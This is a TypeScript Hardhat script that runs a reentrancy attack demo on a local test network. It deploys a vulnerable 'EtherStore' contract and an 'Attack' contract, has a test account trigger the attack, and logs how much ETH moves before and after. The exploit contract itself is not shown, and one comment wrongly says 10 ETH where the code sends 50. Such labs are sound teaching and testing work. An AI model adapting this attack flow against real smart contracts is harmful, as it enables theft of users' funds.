//@ts-nocheck
import { ethers } from "hardhat";
import hre from "hardhat";
import { AddressLike } from "ethers";

async function main() {

    const provider = ethers.provider;

    let owner: AddressLike;
    let addr1: AddressLike;
    let addr2: AddressLike;
    let addr3: AddressLike;

    [owner, addr1, addr2, addr3] = await hre.ethers.getSigners();
    console.log(`Addresses:\r\n
        1: ${await addr1.getAddress()}\r\n
        2: ${await addr2.getAddress()}\r\n 
        3: ${await addr3.getAddress()}\r\n`);

    const etherStore = await ethers.deployContract("EtherStore")
    await etherStore.waitForDeployment();

    const attackContract = await ethers.deployContract("Attack", [etherStore.target])
    await attackContract.waitForDeployment();

    // Owner transfers 10 ETH to Vendor - Needed so we can extract the funds from the Vendor in our attack
    let tx = await owner.sendTransaction({
        to: etherStore.target,
        value: ethers.parseEther("50")
    })
    await tx.wait()

    console.log(`Store balance: ${BigInt(await provider.getBalance(etherStore.target)) / BigInt(10 ** 18)} ETH`)


    // Logs the attackers ETH balance before the attack
    const b4Attack = await provider.getBalance(addr1)
    console.log(`Attacker before attack: ${b4Attack / BigInt(10 ** 18)} ETH`)

    // Executes the reentrancy attack
    try {
        tx = await attackContract.connect(addr1).attack({value: String(1 * 10 ** 18)})
        await tx.wait();
    } catch (e) {
        console.log(`Transaction reverted ${e}`)
    }

    tx = await attackContract.connect(addr1).withdraw();
    await tx.wait();

    // Logs the attackers ETH balance after the attack
    const afterAttack = await provider.getBalance(addr1)
    console.log(`Attacker after attack: ${afterAttack / BigInt(10 ** 18)} ETH`)

    // Total gained ETH after attack and remaining Tokens
    const fundsLostGained = (afterAttack - b4Attack) / BigInt(10 ** 18)
    console.log(`Attacker lost/gained: ${fundsLostGained > 0 ? "+" : "-"}${fundsLostGained} ETH`)
    console.log(`EtherStore now has ${await provider.getBalance(etherStore.target) / BigInt(10 ** 18)} ETH`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
